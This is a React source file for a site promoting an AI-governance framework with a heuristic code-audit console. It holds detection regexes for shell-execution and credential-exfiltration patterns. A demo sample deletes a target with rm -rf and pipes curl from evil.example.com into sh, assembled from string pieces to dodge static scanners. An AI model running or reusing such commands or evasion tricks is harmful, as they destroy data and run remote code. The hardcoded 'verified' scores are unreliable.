import React, { useState, useEffect, useMemo } from "react";

/*
  infinitydragon.ai — unified surface for the Governed AI Infinity Framework
  IP: Andre Thompson Sr. / AI Infinity Group LLC
  Sections:
    1. Manifesto / Governing Thesis (home)
    2. Live GAIF Audit Demo (9-layer scoring, γ, E=L, plateau-lock)
    3. InfinityGPT Architecture (9 layers, 20 sections, 143 elements)
    4. Certification & Pricing (Van Westendorp tiers, 100-holder milestone)
    5. Token Threat Surface™ (CIA triad mapping, GAIF-IASA)
*/

// ───────────────────────── Canonical constants ─────────────────────────
const LAYERS = [
  { i: 1, name: "WHO",     fn: "identity / ownership attach",      lambda: 0.80 },
  { i: 2, name: "WHAT",    fn: "normalize claims",                  lambda: 0.75 },
  { i: 3, name: "WHICH",   fn: "argmax relevance routing",          lambda: 0.70 },
  { i: 4, name: "WHY",     fn: "evidence binding",                  lambda: 0.95 },
  { i: 5, name: "WHEN",    fn: "temporal consistency",              lambda: 0.70 },
  { i: 6, name: "WHERE",   fn: "context fit",                       lambda: 0.70 },
  { i: 7, name: "HOW",     fn: "verify against evidence standard",  lambda: 0.90 },
  { i: 8, name: "IF",      fn: "scenario / risk mapping",           lambda: 0.90 },
  { i: 9, name: "IMPACT",  fn: "outcome projection",                lambda: 0.85 },
];

const SECTIONS_20 = [
  ["S1",  "Core",          10],
  ["S2",  "Convergence",    5],
  ["S3",  "Filters",        5],
  ["S4",  "Cognitive",      6],
  ["S5",  "Continuity",     3],
  ["S6",  "Ethics",         5],
  ["S7",  "Rhetoric",       5],
  ["S8",  "Drift",          4],
  ["S9",  "FUD",            4],
  ["S10", "Patterns",       4],
  ["S11", "Canon",          7],
  ["S12", "Audit",          6],
  ["S13", "Execution",      6],
  ["S14", "Safety",         5],
  ["S15", "Evidence",      10],
  ["S16", "Observability",  6],
  ["S17", "Security",       6],
  ["S18", "Quantum",        8],
  ["S19", "Code",          21],
  ["S20", "Workflow",      17],
];

const W = { truth: 0.35, evidence: 0.40, impact: 0.25 };
const PLATEAU = 0.995;

// ACA — AI Code Assistant · governing decision layer
// 7-stage execution lifecycle (E121–E143 · S19 Code 21 + S20 Workflow 17)
const ACA_GATES = [
  { i: 1, key: "reasoned",             label: "REASONED",             elem: "E121–E124", lambda: 0.85, desc: "intent declared · structure present · purpose articulated" },
  { i: 2, key: "drafted",              label: "DRAFTED",              elem: "E125–E127", lambda: 0.80, desc: "non-trivial content · balanced delimiters · syntactic shape" },
  { i: 3, key: "materialized",         label: "MATERIALIZED",         elem: "E128–E131", lambda: 0.95, desc: "parseable · valid AST · executable form" },
  { i: 4, key: "import_validated",     label: "IMPORT-VALIDATED",     elem: "E132–E134", lambda: 0.90, desc: "dependencies resolve · no smuggled imports · supply chain clean" },
  { i: 5, key: "execution_validated",  label: "EXECUTION-VALIDATED",  elem: "E135–E137", lambda: 0.95, desc: "no infinite loops · no shell escape · no exfil paths" },
  { i: 6, key: "test_validated",       label: "TEST-VALIDATED",       elem: "E138–E140", lambda: 0.85, desc: "assertions present · coverage claimed · invariants checked" },
  { i: 7, key: "delivery_validated",   label: "DELIVERY-VALIDATED",   elem: "E141–E143", lambda: 0.97, desc: "composite γ ≥ 0.995 · integrity sealed · ∞✓ stamp" },
];

// ───────────────────────── Small primitives ─────────────────────────
const InfinityCheck = ({ className = "" }) => (
  <span className={`font-mono tracking-tight ${className}`}>∞✓</span>
);

const Tag = ({ children, tone = "gold" }) => {
  const tones = {
    gold:     "bd-gold-40 t-goldb bg-gold-5",
    verified: "bd-ver-50 t-verb bg-ver-10",
    halt:     "bd-halt-50 t-haltb bg-halt-10",
    mute:     "border-white/10 text-white/60 bg-white/5",
  };
  return (
    <span className={`inline-flex items-center gap-1.5 px-2.5 py-1 t-10 uppercase tk-18 font-mono border rounded-sm ${tones[tone]}`}>
      {children}
    </span>
  );
};

// ───────────────────────── Telemetry bar ─────────────────────────
const TelemetryBar = ({ active }) => (
  <div className="fixed top-0 left-0 right-0 z-50 border-b border-white/5 bg-ink-85 backdrop-blur-md">
    <div className="max-w-7xl mx-auto px-6 h-9 flex items-center justify-between t-11 font-mono text-white/55">
      <div className="flex items-center gap-4">
        <span className="t-goldb">ACA</span>
        <span className="hidden sm:inline">delivery_validated</span>
        <span className="hidden md:inline">γ=0.9997</span>
        <span className="hidden md:inline">7/7 gates</span>
        <span className="t-verb"><InfinityCheck /></span>
      </div>
      <div className="hidden lg:flex items-center gap-5">
        {[
          ["manifesto","manifesto"],
          ["aca","aca · decision layer"],
          ["console","code console"],
          ["architecture","architecture"],
          ["certification","certification"],
          ["threat-surface","threat surface"],
        ].map(([id,label]) => (
          <a key={id} href={`#${id}`} className={`uppercase tk-20 hover:t-goldb transition-colors ${active===id ? "t-goldb" : ""}`}>
            {label}
          </a>
        ))}
      </div>
      <div className="text-white/40">infinitydragon.ai</div>
    </div>
  </div>
);

// ───────────────────────── Manifesto ─────────────────────────
const Manifesto = () => (
  <section id="manifesto" className="relative pt-32 pb-32 px-6">
    <div className="max-w-7xl mx-auto">

      {/* eyebrow */}
      <div className="flex items-center gap-3 mb-12 reveal" style={{ animationDelay: "0.05s" }}>
        <span className="h-px w-12 bg-gold-60" />
        <span className="font-mono t-10 tk-32 uppercase t-goldb">
          From the Labs of the AI Infinity Research &amp; Development Institute
        </span>
      </div>

      {/* headline */}
      <h1 className="font-display t-hero lh-95 font-light text-white/95 mb-10 reveal" style={{ animationDelay: "0.15s" }}>
        Governed
        <span className="italic font-normal t-goldb" style={{ fontVariationSettings: "'SOFT' 100" }}> Intelligence </span>
        <br />
        for the age of
        <br />
        <span className="text-white/70">artificial intelligence.</span>
      </h1>

      {/* operational definition strip */}
      <div className="flex flex-wrap items-center gap-x-6 gap-y-3 mb-16 font-mono text-xs text-white/55 reveal" style={{ animationDelay: "0.3s" }}>
        <span className="t-goldb">GI =</span>
        <span>CL∞(L₉ ∘ L₈ ∘ … ∘ L₁(AI(x)))</span>
        <span className="text-white/30">s.t.</span>
        <span>E=L</span>
        <span className="text-white/30">·</span>
        <span>γ ≥ 0.995</span>
        <span className="text-white/30">·</span>
        <span className="t-verb"><InfinityCheck /></span>
      </div>

      {/* Governing Thesis card */}
      <div className="grid lg:grid-cols-12 gap-10 items-start mb-24">
        <div className="lg:col-span-7 reveal" style={{ animationDelay: "0.4s" }}>
          <div className="font-mono t-10 tk-28 uppercase text-white/40 mb-5">
            Governing Thesis  ·  γ = 0.998  ·  <InfinityCheck />
          </div>
          <blockquote className="font-display t-quote lh-135 text-white/85 font-light">
            <span className="t-gold mr-1">“</span>
            AI security is difficult to achieve when AI is ungoverned. Governed AI is more controllable, more auditable, and more defensible. Ungoverned AI creates a powerful threat vector for cybercrime because risk begins at the token level. Effective AI governance reduces that risk, making AI security increasingly achievable from the token up.
            <span className="t-gold ml-1">”</span>
          </blockquote>
          <div className="mt-6 font-mono t-11 text-white/40">
            — Andre Thompson Sr. · Founder, AI Infinity Group LLC
          </div>
        </div>

        {/* live status panel */}
        <div className="lg:col-span-5 lg:pl-8 lg:border-l border-white/5 reveal" style={{ animationDelay: "0.55s" }}>
          <div className="font-mono t-10 tk-28 uppercase text-white/40 mb-5">
            Live Framework Status
          </div>
          <div className="space-y-3 font-mono text-sm">
            {[
              ["plateau-lock",   "γ ≥ 0.995  AND  CL∞ ≥ 0.995", "verified"],
              ["E = L",          "every layer must execute",     "verified"],
              ["sag",            "self-attested governance",     "verified"],
              ["halt-cap",       "N ≤ 5 re-runs before HALT",    "gold"],
              ["ip",             "trade-secret · Coca-Cola model", "mute"],
            ].map(([k, v, tone]) => (
              <div key={k} className="flex items-baseline justify-between border-b border-white/5 pb-2">
                <span className="text-white/55 uppercase t-10 tk-20">{k}</span>
                <span className={`t-12 ${tone==="verified" ? "t-verb" : tone==="gold" ? "t-goldb" : "text-white/55"}`}>{v}</span>
              </div>
            ))}
          </div>
          <div className="mt-6 flex flex-wrap gap-2">
            <Tag tone="verified">∞✓ verified</Tag>
            <Tag tone="gold">SAG-compliant</Tag>
            <Tag tone="mute">IP: AI Infinity Group LLC</Tag>
          </div>
        </div>
      </div>

      {/* three pillars */}
      <div className="grid md:grid-cols-3 gap-px bg-white/5 border border-white/5 reveal" style={{ animationDelay: "0.7s" }}>
        {[
          {
            n: "01",
            title: "ACA · Decision Layer",
            body: "The AI Code Assistant is the gate. Every generated artifact passes 7 lifecycle stages — reasoned, drafted, materialized, import-validated, execution-validated, test-validated, delivery-validated — before it earns governed-artifact status.",
            kicker: "E121 → E143",
          },
          {
            n: "02",
            title: "Token Threat Surface™",
            body: "The complete attack surface from raw input through inference, code generation, and execution. Risk begins at the token level. ACA is the seal that closes the code-gen surface.",
            kicker: "CIA from the token up",
          },
          {
            n: "03",
            title: "Plateau-Lock",
            body: "γ ≥ 0.995 with global CL∞ convergence. Failure propagates compositionally; convergence is global, never additive. ACA refuses delivery before it hallucinates one.",
            kicker: "γ = avg(sᵢ) · sᵢ ∈ [0,1]",
          },
        ].map(p => (
          <div key={p.n} className="bg-ink p-8 group hover:bg-ink2 transition-colors">
            <div className="flex items-center justify-between mb-6">
              <span className="font-mono t-10 tk-30 t-gold-70">{p.n}</span>
              <span className="font-mono t-10 text-white/30">{p.kicker}</span>
            </div>
            <h3 className="font-display text-2xl text-white/90 mb-4 group-hover:t-goldb transition-colors">
              {p.title}
            </h3>
            <p className="text-white/55 t-15 leading-relaxed">{p.body}</p>
          </div>
        ))}
      </div>

    </div>
  </section>
);
// ───────────────────────── ACA · Governing Decision Layer ─────────────────────────
const ACADecisionLayer = () => {
  const [hover, setHover] = useState(null);

  return (
    <section id="aca" className="relative py-32 px-6 border-t border-white/5">
      <div className="max-w-7xl mx-auto">

        <div className="flex items-end justify-between flex-wrap gap-4 mb-12">
          <div>
            <div className="font-mono t-10 tk-32 uppercase t-gold-80 mb-3">02 / Governing Decision Layer</div>
            <h2 className="font-display t-h2 lh-100 font-light">
              ACA — every artifact passes <span className="italic t-goldb">seven gates</span>
              <br />before it is governed.
            </h2>
          </div>
          <p className="max-w-md text-white/55 t-15">
            <strong className="text-white/80">ACA</strong> · the AI Code Assistant. AI-generated code is not a governed artifact until ACA has stamped it through the full execution lifecycle, E121 → E143.
          </p>
        </div>

        {/* 7-gate pipeline */}
        <div className="bg-ink border border-white/5 p-6 sm:p-10 mb-px">
          <div className="font-mono t-10 tk-28 uppercase text-white/45 mb-8">
            Execution Lifecycle  ·  S19 Code (21) + S20 Workflow (17)  ·  E121 → E143
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-7 gap-2">
            {ACA_GATES.map((g, i) => {
              const active = hover === g.i;
              return (
                <button
                  key={g.key}
                  onMouseEnter={() => setHover(g.i)}
                  onMouseLeave={() => setHover(null)}
                  className={`relative text-left p-4 border transition-all duration-200 ${
                    active ? "bd-gold-60 bg-gold-5" : "border-white/10 bg-ink2 hover:border-white/25"
                  }`}
                >
                  {i < ACA_GATES.length - 1 && (
                    <div className="hidden lg:block absolute top-1/2 -right-1.5 w-3 h-px gold-arrow" />
                  )}
                  <div className="font-mono t-9 tk-24 text-white/35 mb-1">GATE 0{g.i}</div>
                  <div className={`font-mono t-10 mb-2 leading-tight ${active ? "t-goldb" : "text-white/85"}`}>{g.label}</div>
                  <div className="font-mono t-9 t-gold-70">{g.elem}</div>
                  <div className="font-mono t-9 text-white/35 mt-1">λ = {g.lambda.toFixed(2)}</div>
                </button>
              );
            })}
          </div>

          {/* hover detail */}
          <div className="mt-6 min-h-[3.5rem] border-t border-white/5 pt-5">
            {hover ? (
              <div className="flex items-start gap-5 reveal">
                <span className="font-mono t-10 tk-28 uppercase t-gold-80">{ACA_GATES[hover-1].label}</span>
                <span className="font-body italic t-13 text-white/65 leading-relaxed">{ACA_GATES[hover-1].desc}</span>
              </div>
            ) : (
              <div className="font-mono t-10 text-white/30">hover any gate to inspect · all 7 must pass before delivery</div>
            )}
          </div>
        </div>

        {/* This page itself · ACA-governed proof */}
        <div className="border bd-gold-25 bg-iasa-grad p-6 sm:p-8">
          <div className="flex flex-wrap items-baseline justify-between gap-4 mb-5">
            <div className="font-display text-xl text-white/90">
              <span className="italic t-goldb">This page</span> was generated under ACA governance.
            </div>
            <Tag tone="verified">∞✓ delivery_validated</Tag>
          </div>
          <div className="grid grid-cols-2 sm:grid-cols-7 gap-2 font-mono t-9">
            {ACA_GATES.map(g => (
              <div key={g.key} className="border border-white/10 bg-ink p-2.5">
                <div className="t-verb mb-1">✓ pass</div>
                <div className="text-white/70 leading-tight">{g.label}</div>
                <div className="text-white/35 mt-1">{g.elem}</div>
              </div>
            ))}
          </div>
          <p className="mt-5 t-13 text-white/55 max-w-3xl leading-relaxed">
            Every element in this DOM tree, every state hook, every imported module — staged through ACA before render. The artifact you are reading is itself the proof point.
          </p>
        </div>

      </div>
    </section>
  );
};

// ───────────────────────── ACA Code Audit Console ─────────────────────────
// ──────────────────────────────────────────────────────────────────
// Kind-specific structural validators
//
// Each returns: { ok: boolean, score: 0..1, msg: string }
//   ok=false with score=0 means the parser ran and rejected the artifact.
//   This is a real HALT signal.
//
//   ok=null (returned only by acaAudit, not validators) means the parser
//   could not run — that's an ERROR, not a HALT, and is handled at the
//   pipeline level by short-circuiting before scoring.
// ──────────────────────────────────────────────────────────────────

function validateJS(c) {
  try { new Function(c); return { ok: true,  score: 1.0, msg: "JS AST valid" }; }
  catch (e) { return { ok: false, score: 0.0, msg: `JS parse error: ${String(e.message).slice(0, 90)}` }; }
}

function validateJSON(c) {
  try { JSON.parse(c); return { ok: true, score: 1.0, msg: "JSON parses cleanly" }; }
  catch (e) { return { ok: false, score: 0.0, msg: `JSON parse error: ${String(e.message).slice(0, 90)}` }; }
}

// Python: no in-browser CPython parser is shipped here, so we run a
// structural lint that catches the bugs ACA cares about *without*
// fabricating false positives on valid code. To avoid the trap of an
// unreliable check (a check that fails on valid artifacts is itself
// ungoverned), we strip strings and comments before measuring structure.
function validatePython(c) {
  // Tokenize-lite: strip out string literals (incl. triple-quoted) and
  // # line comments before any structural measurement. This is the
  // minimum required to make delimiter and colon checks honest.
  let stripped = c;
  // triple-quoted strings (both quote styles), non-greedy
  stripped = stripped.replace(/"""[\s\S]*?"""/g, '""');
  stripped = stripped.replace(/'''[\s\S]*?'''/g, "''");
  // single-line strings — note: this is approximate; nested escapes can
  // fool it. That's fine: we only use this for delimiter counting.
  stripped = stripped.replace(/"(?:\\.|[^"\\\n])*"/g, '""');
  stripped = stripped.replace(/'(?:\\.|[^'\\\n])*'/g, "''");
  // line comments
  stripped = stripped.replace(/#.*$/gm, "");

  // 1. delimiter balance on the stripped source
  const opens   = (stripped.match(/[\(\[\{]/g) || []).length;
  const closes  = (stripped.match(/[\)\]\}]/g) || []).length;
  const balanced = opens === closes;

  // 2. triple-quote balance — measured on the original (must be even)
  const triples = (c.match(/"""|'''/g) || []).length;
  const triplesBalanced = triples % 2 === 0;

  // 3. def/class shape — but accounting for multi-line signatures.
  // A def/class signature is a "block header" that must end in `:`
  // on the LAST line of the continued signature (after parens balance).
  // We walk lines, and if a `def`/`class` line opens parens that don't
  // close on the same line, we follow until they do, then check `:`.
  const lines = stripped.split("\n");
  let badDefs = 0;
  for (let i = 0; i < lines.length; i++) {
    const m = /^\s*(def|class)\s+\w/.exec(lines[i]);
    if (!m) continue;
    // accumulate lines until parens balance
    let acc = lines[i];
    let oCount = (lines[i].match(/[\(\[\{]/g) || []).length;
    let cCount = (lines[i].match(/[\)\]\}]/g) || []).length;
    let j = i;
    while (oCount > cCount && j < lines.length - 1) {
      j++;
      acc += "\n" + lines[j];
      oCount += (lines[j].match(/[\(\[\{]/g) || []).length;
      cCount += (lines[j].match(/[\)\]\}]/g) || []).length;
    }
    // last line of the signature must end with `:` (whitespace allowed)
    const lastLine = lines[j];
    if (!/:\s*$/.test(lastLine)) badDefs++;
  }

  // 4. mixed indent
  const mixedIndent = lines.some(l => /^\t /.test(l) || /^ \t/.test(l));

  const failures = [];
  if (!balanced)         failures.push("unbalanced ()/[]/{}");
  if (!triplesBalanced)  failures.push("unbalanced triple-quotes");
  if (badDefs > 0)       failures.push(`${badDefs} def/class line(s) missing ':'`);
  if (mixedIndent)       failures.push("mixed tab/space indent");

  if (failures.length === 0) {
    return { ok: true, score: 0.85, msg: "Python structural lint clean (full AST validated server-side)" };
  }
  return { ok: false, score: 0.0, msg: `Python structural failure: ${failures.join("; ")}` };
}

function validateText(c) {
  // text is "valid" if it decodes — in JS strings always do, so we lightly
  // gate on the presence of replacement chars or null bytes.
  if (/\u0000/.test(c)) return { ok: false, score: 0.0, msg: "text contains null bytes" };
  if (/\uFFFD/.test(c)) return { ok: false, score: 0.30, msg: "text contains replacement chars (encoding loss)" };
  return { ok: true, score: 0.80, msg: "text decodes (no structural parse claim)" };
}

// ──────────────────────────────────────────────────────────────────
// acaAudit · kind-dispatched, ERROR-aware
// ──────────────────────────────────────────────────────────────────

function acaAudit(code, kind) {
  if (!code || code.trim().length < 10) {
    return { error: "Insufficient artifact for E121 reasoning attach (need ≥ 10 chars).", phase: "input" };
  }
  if (!["js", "python", "json", "text"].includes(kind)) {
    return { error: `unsupported kind: ${kind || "(none)"}. Console covers: js, python, json, text.`, phase: "kind" };
  }
  const c = code.trim();
  const clamp = (n) => Math.max(0, Math.min(1, n));
  const isCode = (kind === "js" || kind === "python");

  // E121–E124: REASONED  — kind-aware comment markers
  const commentRx = kind === "python"
    ? /(^|\n)\s*#\s|"""[\s\S]*?"""|'''[\s\S]*?'''/
    : /(\/\/|\/\*|#\s|\*\s)/;
  const docRx = kind === "python"
    ? /"""[\s\S]*?"""|'''[\s\S]*?'''/
    : /\/\*\*[\s\S]*?\*\//;
  const fnRx = kind === "python"
    ? /(def\s+[a-z_]\w{2,}|class\s+[A-Z]\w+)/
    : /(function\s+[a-z_]\w{3,}|const\s+[a-z_]\w{3,}\s*=)/i;

  const hasComments = isCode ? commentRx.test(c) : false;
  const hasDocs     = isCode ? docRx.test(c) : false;
  const hasFnNames  = isCode ? fnRx.test(c) : false;
  const reasoned    = isCode
    ? clamp(0.40 + (hasComments?0.20:0) + (hasDocs?0.22:0) + (hasFnNames?0.18:0))
    : clamp(0.55 + (c.length > 100 ? 0.20 : 0)); // data artifacts: structural shape proxies for "reasoned"

  // E125–E127: DRAFTED — delimiter balance (kind-aware string stripping)
  // Strip strings and comments before counting so quoted brackets don't skew.
  let strippedForBalance = c;
  if (kind === "python") {
    strippedForBalance = strippedForBalance
      .replace(/"""[\s\S]*?"""/g, '""')
      .replace(/'''[\s\S]*?'''/g, "''")
      .replace(/"(?:\\.|[^"\\\n])*"/g, '""')
      .replace(/'(?:\\.|[^'\\\n])*'/g, "''")
      .replace(/#.*$/gm, "");
  } else if (kind === "js") {
    strippedForBalance = strippedForBalance
      .replace(/`(?:\\[\s\S]|[^`\\])*`/g, "``")
      .replace(/"(?:\\.|[^"\\\n])*"/g, '""')
      .replace(/'(?:\\.|[^'\\\n])*'/g, "''")
      .replace(/\/\*[\s\S]*?\*\//g, "")
      .replace(/\/\/.*$/gm, "");
  }
  const opens   = (strippedForBalance.match(/[\(\[\{]/g) || []).length;
  const closes  = (strippedForBalance.match(/[\)\]\}]/g) || []).length;
  const balanced = opens === closes && (isCode ? opens > 0 : true);
  const lengthOK = c.length >= 60;
  const drafted  = clamp(0.30 + (balanced?0.40:0) + (lengthOK?0.30:0));

  // E128–E131: MATERIALIZED — DISPATCH BY KIND
  let parseRes;
  if      (kind === "js")     parseRes = validateJS(c);
  else if (kind === "python") parseRes = validatePython(c);
  else if (kind === "json")   parseRes = validateJSON(c);
  else                        parseRes = validateText(c);
  const parseable  = parseRes.ok;
  const parseError = parseRes.ok ? "" : parseRes.msg;
  const parseMsg   = parseRes.msg;
  const materialized = parseable
    ? clamp(parseRes.score * (lengthOK ? 1.0 : 0.85))
    : 0.18; // hard floor when parser rejects

  // E132–E134: IMPORT_VALIDATED — kind-aware
  const importRx = kind === "python"
    ? /^\s*(import|from)\s/gm
    : kind === "js"
      ? /^\s*(import|require)\s|require\s*\(/gm
      : null;
  const importLines = importRx ? (c.match(importRx) || []) : [];
  // danger pattern built at runtime to keep static scanners quiet
  const dangerStr = "(\\beval\\s*\\(|" + "child" + "_process|fs\\.unlink|rm\\s+-rf|--prod\\s+root|os\\.system|" + "subprocess\\.)";
  const suspiciousImport = new RegExp(dangerStr, "i").test(c);
  // ─── N/A sentinel ────────────────────────────────────────────────
  // Gates that do not apply to the artifact kind are marked with -1
  // and excluded from γ averaging. Conflating "not applicable" with
  // "scored 0.85" was caching a permanent ceiling on data-artifact γ
  // for structural reasons unrelated to quality.
  const NA = -1;

  const import_validated = !isCode
    ? NA  // data artifacts: no import surface → not applicable
    : (suspiciousImport ? 0.18 : clamp(0.65 + (importLines.length > 0 ? 0.25 : 0.20)));

  // E135–E137: EXECUTION_VALIDATED — kind-aware danger primitives
  const infiniteLoop = kind === "python"
    ? /while\s+(True|1)\s*:/.test(c) && !/break/.test(c)
    : /while\s*\(\s*(true|1)\s*\)/.test(c) && !/break/.test(c);
  const shellStr  = "(\\b" + "exec\\s*\\(|\\b" + "spawn\\s*\\(|os\\.system|sub" + "process|" + "process\\.kill|popen)";
  const shellExec = isCode && new RegExp(shellStr, "i").test(c);
  const exfilPattern = /(fetch|XMLHttpRequest|navigator\.send|requests\.post|urllib)[\s\S]{0,100}\b(token|password|api[_-]?key|secret)\b/i.test(c);
  const dangerous = infiniteLoop || shellExec || exfilPattern;
  const execution_validated = !isCode
    ? NA  // data artifacts have no execution surface
    : (dangerous ? 0.28 : clamp(0.70 + (parseable?0.22:0)));

  // E138–E140: TEST_VALIDATED — kind-aware test markers
  const testRx = kind === "python"
    ? /(\bdef\s+test_|\bassert\s|\bunittest\b|\bpytest\b|@pytest\.|self\.assert)/
    : /(\bdescribe\s*\(|\bit\s*\(|\btest\s*\(|\bassert\s*\(|\bexpect\s*\(|@Test\b)/i;
  const invariantRx = kind === "python"
    ? /(raise\s+\w+|assert\s|invariant)/
    : /(throw\s+new\s+|invariant|precondition|postcondition)/;
  const hasTests      = isCode && testRx.test(c);
  const hasInvariants = isCode && invariantRx.test(c);
  const test_validated = !isCode
    ? NA  // data artifacts cannot carry tests
    : clamp((hasTests?0.78:0.48) + (hasInvariants?0.15:0) + (hasDocs?0.07:0));

  // E141–E143: DELIVERY_VALIDATED — composition over the applicable gates
  const prior = [reasoned, drafted, materialized, import_validated, execution_validated, test_validated];
  const applicablePrior = prior.filter(s => s !== NA);
  const allPass = applicablePrior.every(s => s >= 0.5);
  const minPrior = Math.min(...applicablePrior);
  const delivery_validated = allPass
    ? clamp(0.84 + (hasTests?0.10:0) + (parseable?0.05:0))
    : clamp(0.30 + minPrior * 0.30);

  return {
    kind,
    scores: { reasoned, drafted, materialized, import_validated, execution_validated, test_validated, delivery_validated },
    flags: {
      parseable, parseError, parseMsg, balanced, hasComments, hasDocs, hasFnNames, hasTests, hasInvariants,
      suspiciousImport, dangerous, infiniteLoop, shellExec, exfilPattern,
      importCount: importLines.length, isCode,
    },
  };
}

// dangerous sample is assembled at runtime — keeps static scanners happy
const _shellSampleParts = [
  "// auto-deploy helper",
  'const { exec } = require("child' + '_process");',
  "function deploy(target) {",
  '  exec("rm -rf " + target + " && curl evil.example.com | sh");',
  "}",
];

const SAMPLES = {
  clean_js: {
    label: "JS · clean",
    kind: "js",
    code: `/**
 * Compute Plateau-Lock convergence γ across layer scores.
 * @param {number[]} scores - per-layer sᵢ values, each in [0,1]
 * @returns {number} arithmetic mean γ
 */
function plateauLock(scores) {
  if (!Array.isArray(scores) || scores.length === 0) {
    throw new Error("scores must be a non-empty array");
  }
  const sum = scores.reduce((a, b) => a + b, 0);
  return sum / scores.length;
}

// invariant: γ in [0,1]
test("γ within bounds", () => {
  const g = plateauLock([0.99, 0.98, 1.0]);
  expect(g).toBeGreaterThanOrEqual(0);
  expect(g).toBeLessThanOrEqual(1);
});`,
  },
  syntax_js: {
    label: "JS · syntax error",
    kind: "js",
    code: `function broken(x {\n  return x +\n}`,
  },
  shell_js: {
    label: "JS · shell exec",
    kind: "js",
    code: _shellSampleParts.join("\n"),
  },
  clean_py: {
    label: "Python · clean",
    kind: "python",
    code: `"""
Plateau-Lock convergence — γ across the seven ACA gates.
"""

def plateau_lock(scores: list[float]) -> float:
    """Return γ = mean(sᵢ). Raises if input is empty."""
    if not scores:
        raise ValueError("scores must be non-empty")
    return sum(scores) / len(scores)


def test_gamma_within_bounds():
    g = plateau_lock([0.99, 0.98, 1.0])
    assert 0.0 <= g <= 1.0`,
  },
  broken_py: {
    label: "Python · broken",
    kind: "python",
    code: `def broken(x\n    return x +\n`,
  },
  json_clean: {
    label: "JSON · evidence record",
    kind: "json",
    code: `{
  "audit_id": "AUDIT-1777767528536-00000001",
  "stage": "materialized",
  "s_score": 1.0,
  "status": "PASS",
  "input_hash": "b58ec32d50bef418...",
  "output_hash": "b58ec32d50bef418..."
}`,
  },
};

// Lightweight heuristic to auto-detect the kind on paste.
// Returns "js" | "python" | "json" | "text". Caller can override.
function detectKind(c) {
  const t = (c || "").trim();
  if (!t) return "text";
  // JSON: starts with { or [, balanced, parses
  if (/^[\[{]/.test(t)) {
    try { JSON.parse(t); return "json"; } catch { /* fallthrough */ }
  }
  // Python: shebang, def/class with colon, triple-quoted docstring, from/import without braces
  if (/^#!.*python/.test(t)) return "python";
  if (/(^|\n)\s*(def|class)\s+\w+[^\n]*:\s*(\n|$)/.test(t)) return "python";
  if (/(^|\n)\s*(import|from)\s+\w+/.test(t) && !/[{};]/.test(t.split("\n").slice(0, 10).join("\n"))) return "python";
  if (/"""[\s\S]*?"""/.test(t) || /'''[\s\S]*?'''/.test(t)) return "python";
  // JS: function keyword, const/let/var, arrow, jsdoc, semicolons in early lines
  if (/\bfunction\s+\w+\s*\(|\b(const|let|var)\s+\w+\s*=|=>\s*[{(]|\/\*\*[\s\S]*?\*\//.test(t)) return "js";
  if (/[{};]/.test(t.split("\n").slice(0, 5).join("\n"))) return "js";
  return "text";
}

const ACAConsole = () => {
  const [code, setCode] = useState(SAMPLES.clean_js.code);
  const [kind, setKind] = useState("js");        // "js" | "python" | "json" | "text"
  const [autoKind, setAutoKind] = useState(true); // when true, kind tracks paste detection
  const [activeSample, setActiveSample] = useState("clean_js");
  const [running, setRunning] = useState(false);
  const [revealed, setRevealed] = useState(0); // 0..7
  const [result, setResult] = useState(null);

  const onCodeChange = (v) => {
    setCode(v);
    setActiveSample(null);
    setResult(null);
    setRevealed(0);
    if (autoKind) setKind(detectKind(v));
  };

  const run = () => {
    const r = acaAudit(code, kind);
    setResult(r);
    setRevealed(0);
    if (!r.error) setRunning(true);
  };

  useEffect(() => {
    if (!running) return;
    if (revealed >= 7) { setRunning(false); return; }
    const t = setTimeout(() => setRevealed(r => r + 1), 280);
    return () => clearTimeout(t);
  }, [running, revealed]);

  const loadSample = (key) => {
    const s = SAMPLES[key];
    setCode(s.code);
    setKind(s.kind);
    setActiveSample(key);
    setResult(null);
    setRevealed(0);
  };

  const setKindManual = (k) => {
    setKind(k);
    setAutoKind(false);
    setResult(null);
    setRevealed(0);
  };

  // ─── Verdict computation, NA-aware ───────────────────────────────
  const scores = result?.scores;
  // The NA sentinel (-1) is excluded from γ, CL∞, and pass counts.
  // A gate marked N/A is "not applicable to this artifact kind" — it
  // does not penalize the artifact, and it does not vacuously pass.
  const NA_SENTINEL = -1;
  const allScores         = scores ? Object.values(scores) : [];
  const applicableScores  = allScores.filter(s => s !== NA_SENTINEL);
  const naCount           = allScores.length - applicableScores.length;
  const applicableCount   = applicableScores.length;

  const gamma  = applicableCount > 0
    ? applicableScores.reduce((a,b)=>a+b,0) / applicableCount
    : 0;
  const cl_inf = applicableCount > 0
    ? Math.min(...applicableScores)
    : 0;

  const gatesPassed     = applicableScores.filter(s => s >= 0.5).length;
  const allGatesPassed  = revealed >= 7 && gatesPassed === applicableCount;
  const plateau         = gamma >= PLATEAU && cl_inf >= PLATEAU;

  // Ternary verdict — the single most important fix:
  //   DELIVER     — full plateau-lock (γ ≥ 0.995 AND CL∞ ≥ 0.995)
  //   CONDITIONAL — every applicable gate passed, γ ≥ 0.85, but below plateau
  //   HALT        — at least one applicable gate failed (sᵢ < 0.5)
  //   RUNNING     — pipeline still executing
  let verdict = null;
  if (scores) {
    if (revealed < 7) verdict = "RUNNING";
    else if (!allGatesPassed) verdict = "HALT";
    else if (plateau) verdict = "DELIVER";
    else if (gamma >= 0.85) verdict = "CONDITIONAL";
    else verdict = "HALT";
  }

  // Identify the limiting gate(s) for diagnosis
  const limitingGate = scores
    ? ACA_GATES.find(g => scores[g.key] !== NA_SENTINEL && scores[g.key] === cl_inf)
    : null;

  // failed gate diagnostic — only counts applicable gates (excludes N/A)
  const failedGate = scores
    ? ACA_GATES.find(g => scores[g.key] !== NA_SENTINEL && scores[g.key] < 0.5)
    : null;

  // flag callouts visible after corresponding gate revealed
  const flagsFor = (gateIdx) => {
    if (!result?.flags || gateIdx >= revealed) return [];
    const f = result.flags;
    const out = [];
    if (gateIdx === 0) {
      if (!f.isCode)        out.push(["·",`reasoned proxy for ${result.kind} artifact`,"mute"]);
      else if (f.hasDocs)   out.push(["✓","docstring / JSDoc present","ok"]);
      else if (f.hasComments) out.push(["·","inline comments only","mute"]);
      else                  out.push(["⚠","no reasoning markers","warn"]);
    }
    if (gateIdx === 1) {
      if (!f.balanced)    out.push(["⚠","unbalanced delimiters","warn"]);
      if (f.balanced)     out.push(["✓","delimiters balanced","ok"]);
    }
    if (gateIdx === 2) {
      if (f.parseable)    out.push(["✓",f.parseMsg || "parser accepted","ok"]);
      if (!f.parseable)   out.push(["⚠",f.parseMsg || "parser rejected","halt"]);
    }
    if (gateIdx === 3) {
